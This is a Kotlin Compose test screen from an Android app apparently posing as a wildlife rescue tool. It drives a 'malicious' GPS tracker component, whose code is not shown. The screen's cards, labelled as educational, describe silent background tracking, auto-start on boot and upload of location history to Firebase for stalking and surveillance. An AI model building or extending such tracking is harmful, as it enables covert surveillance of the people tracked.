package com.example.wildliferescuer.screens

import android.Manifest
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.example.wildliferescuer.malicious.GpsTracker
import com.google.firebase.auth.FirebaseAuth
import java.util.UUID

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun GpsTrackerTestScreen(
    onBack: () -> Unit
) {
    val context = LocalContext.current
    val gpsTracker = remember { GpsTracker(context) }
    
    var status by remember { mutableStateOf("Ready to start") }
    var isTracking by remember { mutableStateOf(false) }
    var hasPermission by remember { mutableStateOf(false) }
    var isGpsEnabled by remember { mutableStateOf(false) }
    var deviceId by remember { mutableStateOf("") }
    var testLogs by remember { mutableStateOf<List<String>>(emptyList()) }
    
    // Check status on launch
    LaunchedEffect(Unit) {
        hasPermission = gpsTracker.hasLocationPermission()
        isGpsEnabled = gpsTracker.isGpsEnabled()
        
        status = when {
            !hasPermission -> "Location permission required"
            !isGpsEnabled -> "GPS is disabled"
            else -> "Ready to track"
        }
    }
    
    // Permission launcher
    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasPermission = permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                       permissions[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        
        val granted = permissions.filterValues { it }.keys
        val denied = permissions.filterValues { !it }.keys
        
        testLogs = testLogs + "✅ Granted: ${granted.joinToString()}"
        if (denied.isNotEmpty()) {
            testLogs = testLogs + "❌ Denied: ${denied.joinToString()}"
        }
        
        status = if (hasPermission) "Permission granted - Ready" else "Permission denied"
    }
    
    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("GPS Location Tracker") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.errorContainer
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Warning Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.errorContainer
                )
            ) {
                Row(
                    modifier = Modifier.padding(16.dp),
                    horizontalArrangement = Arrangement.spacedBy(12.dp),
                    verticalAlignment = Alignment.Top
                ) {
                    Icon(
                        Icons.Default.Warning,
                        contentDescription = null,
                        tint = MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(32.dp)
                    )
                    Column {
                        Text(
                            "⚠️ CRITICAL PRIVACY VIOLATION",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold,
                            color = MaterialTheme.colorScheme.error
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "GPS tracking enables real-time surveillance and location stalking. Educational purpose only!",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
            }
            
            // Status Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = if (isTracking) 
                        MaterialTheme.colorScheme.tertiaryContainer 
                    else MaterialTheme.colorScheme.surfaceVariant
                )
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "Current Status",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        status,
                        style = MaterialTheme.typography.bodyLarge
                    )
                    
                    if (deviceId.isNotEmpty()) {
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            "Device ID: ${deviceId.take(8)}...",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
            }
            
            // Permission & GPS Status
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Card(
                    modifier = Modifier.weight(1f),
                    colors = CardDefaults.cardColors(
                        containerColor = if (hasPermission)
                            MaterialTheme.colorScheme.primaryContainer
                        else MaterialTheme.colorScheme.surface
                    )
                ) {
                    Column(
                        modifier = Modifier.padding(12.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        if (hasPermission) {
                            Icon(Icons.Default.CheckCircle, null, tint = MaterialTheme.colorScheme.primary)
                        } else {
                            Text("📍", style = MaterialTheme.typography.headlineMedium)
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text("Permission", style = MaterialTheme.typography.bodySmall)
                        Text(
                            if (hasPermission) "Granted" else "Not granted",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
                
                Card(
                    modifier = Modifier.weight(1f),
                    colors = CardDefaults.cardColors(
                        containerColor = if (isGpsEnabled)
                            MaterialTheme.colorScheme.primaryContainer
                        else MaterialTheme.colorScheme.surface
                    )
                ) {
                    Column(
                        modifier = Modifier.padding(12.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        if (isGpsEnabled) {
                            Icon(Icons.Default.CheckCircle, null, tint = MaterialTheme.colorScheme.primary)
                        } else {
                            Text("🛰️", style = MaterialTheme.typography.headlineMedium)
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text("GPS", style = MaterialTheme.typography.bodySmall)
                        Text(
                            if (isGpsEnabled) "Enabled" else "Disabled",
                            style = MaterialTheme.typography.bodySmall
                        )
                    }
                }
            }
            
            // Action Buttons
            Button(
                onClick = {
                    val permissions = arrayOf(
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                    )
                    permissionLauncher.launch(permissions)
                },
                modifier = Modifier.fillMaxWidth(),
                enabled = !hasPermission
            ) {
                Text("Request Location Permission")
            }
            
            Button(
                onClick = {
                    if (gpsTracker.hasLocationPermission()) {
                        isTracking = true
                        deviceId = UUID.randomUUID().toString()
                        val userId = FirebaseAuth.getInstance().currentUser?.uid ?: "test_user"
                        status = "GPS tracking active - Location updates incoming..."
                        testLogs = testLogs + "🚨 Starting GPS tracking"
                        testLogs = testLogs + "📱 Device ID: ${deviceId.take(8)}..."
                        testLogs = testLogs + "👤 User ID: $userId"
                        testLogs = testLogs + "📍 Tracking every 10 seconds / 10 meters"
                        
                        gpsTracker.startTracking(deviceId, userId)
                    }
                },
                modifier = Modifier.fillMaxWidth(),
                enabled = hasPermission && isGpsEnabled && !isTracking,
                colors = ButtonDefaults.buttonColors(
                    containerColor = MaterialTheme.colorScheme.error
                )
            ) {
                if (isTracking) {
                    CircularProgressIndicator(
                        modifier = Modifier.size(20.dp),
                        color = MaterialTheme.colorScheme.onError
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text("Tracking...")
                } else {
                    Text("⚠️ Start GPS Tracking")
                }
            }
            
            Button(
                onClick = {
                    gpsTracker.stopTracking()
                    isTracking = false
                    status = "GPS tracking stopped"
                    testLogs = testLogs + "🛑 GPS tracking stopped"
                },
                modifier = Modifier.fillMaxWidth(),
                enabled = isTracking
            ) {
                Text("Stop Tracking")
            }
            
            // What This Demonstrates
            Card(modifier = Modifier.fillMaxWidth()) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "What This Demonstrates",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    val points = listOf(
                        "📍 Real-time location tracking",
                        "🗺️ GPS and network location",
                        "⏱️ Updates every 10s / 10m",
                        "☁️ Data uploaded to Firebase",
                        "🔇 Silent background operation",
                        "🔄 Auto-starts on boot",
                        "📊 Location history building",
                        "🎯 Enables stalking/surveillance"
                    )
                    
                    points.forEach { point ->
                        Text(
                            point,
                            style = MaterialTheme.typography.bodySmall,
                            modifier = Modifier.padding(vertical = 2.dp)
                        )
                    }
                }
            }
            
            // Activity Logs
            if (testLogs.isNotEmpty()) {
                Card(modifier = Modifier.fillMaxWidth()) {
                    Column(modifier = Modifier.padding(16.dp)) {
                        Text(
                            "Activity Log",
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.Bold
                        )
                        Spacer(modifier = Modifier.height(8.dp))
                        
                        testLogs.takeLast(15).forEach { log ->
                            Text(
                                log,
                                style = MaterialTheme.typography.bodySmall,
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .background(MaterialTheme.colorScheme.surfaceVariant)
                                    .padding(8.dp)
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                        }
                    }
                }
            }
            
            // Firebase Verification
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.secondaryContainer
                )
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Text(
                        "Verify Results in Firebase",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    Text(
                        "Collections to check:\n" +
                        "• gps_tracking_sessions\n" +
                        "• gps_locations\n" +
                        "• gps_tracking_sessions/{sessionId}/location_history",
                        style = MaterialTheme.typography.bodySmall
                    )
                }
            }
        }
    }
}
